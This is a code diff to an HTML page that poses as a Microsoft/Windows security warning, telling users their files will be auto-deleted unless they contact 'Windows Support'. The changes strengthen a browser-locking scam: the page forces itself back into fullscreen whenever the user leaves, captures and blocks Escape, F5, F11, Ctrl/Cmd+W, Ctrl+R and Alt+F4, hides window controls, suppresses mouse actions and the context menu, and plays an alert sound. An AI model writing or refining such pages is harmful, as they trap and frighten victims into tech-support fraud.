@@ -13,7 +13,7 @@
       font-family: 'Segoe UI', Arial, sans-serif;
       user-select: none;
       overflow: hidden;
-      cursor: none;
+      /* cursor: none;  Uncomment if you want to hide the cursor */
     }
     .overlay-blue {
       position: fixed;
@@ -78,25 +78,9 @@
       font-size: 1.08em;
       margin: 0;
     }
-    .buttons-row {
-      display: flex;
-      flex-direction: row-reverse;
-      gap: 18px;
-      justify-content: flex-end;
-      margin-top: 24px;
-    }
-    .btn {
-      background: #e9ecef;
-      border: 1.5px solid #7a92bd;
-      color: #133873;
-      padding: 8px 25px;
-      font-size: 1em;
-      border-radius: 3px;
-      outline: none;
-      cursor: none;
-      pointer-events: none;
-      opacity: 0.5;
-      font-weight: 500;
+    /* Hide any buttons or browser-like controls */
+    .buttons-row, .close, .minimize, .maximize {
+      display: none !important;
     }
     .ms-logo {
       margin-right: 6px;
@@ -108,28 +92,43 @@
     }
   </style>
   <script>
-    // --- FULL SCREEN ---
+    // --- FULL SCREEN MANAGEMENT ---
     function goFullscreen() {
       let el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen();
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
       else if (el.msRequestFullscreen) el.msRequestFullscreen();
     }
-    window.onload = () => {
-      goFullscreen();
-      playAlert();
-    };
+
+    // Re-enter fullscreen if exited
+    document.addEventListener('fullscreenchange', () => {
+      if (!document.fullscreenElement) setTimeout(goFullscreen, 100);
+    });
+    document.addEventListener('webkitfullscreenchange', () => {
+      if (!document.webkitIsFullScreen) setTimeout(goFullscreen, 100);
+    });
+    document.addEventListener('msfullscreenchange', () => {
+      if (!document.msFullscreenElement) setTimeout(goFullscreen, 100);
+    });
+
     // --- Block user actions ---
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => {
-      const blockKeys = ['F11', 'F5', 'Escape', 'Tab'];
+      // Block Escape, F11, F5, Ctrl+W, Ctrl+R, Alt+F4, Cmd+W (Mac)
       if (
-        blockKeys.includes(e.key) ||
-        (e.ctrlKey && ['w','r'].includes(e.key.toLowerCase()))
-      ) e.preventDefault();
-    });
+        ['Escape', 'F11', 'F5'].includes(e.key) ||
+        (e.ctrlKey && ['w','r'].includes(e.key.toLowerCase())) ||
+        (e.metaKey && ['w','r'].includes(e.key.toLowerCase())) ||
+        (e.altKey && e.key.toLowerCase() === 'f4')
+      ) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+    }, true);
     document.addEventListener('mousedown', e => e.preventDefault());
     document.onselectstart = () => false;
+
     // --- Sound effect logic ---
     let soundPlayed = false;
     function playAlert() {
@@ -143,6 +142,12 @@
       }
     }
     document.addEventListener('click', playAlert, { once: true });
+
+    // --- Initial actions ---
+    window.onload = () => {
+      goFullscreen();
+      playAlert();
+    };
   </script>
 </head>
 <body>
@@ -170,10 +175,6 @@
       <small>
         Note: If you think this Notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this Computer ID is flagged and is connected over the internet Servers, files and apps deletion may start any moment.
       </small>
-    </div>
-    <div class="buttons-row">
-      <button class="btn">Allow</button>
-      <button class="btn">Deny</button>
     </div>
     <div style="margin-top:12px;">
       <img class="ms-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
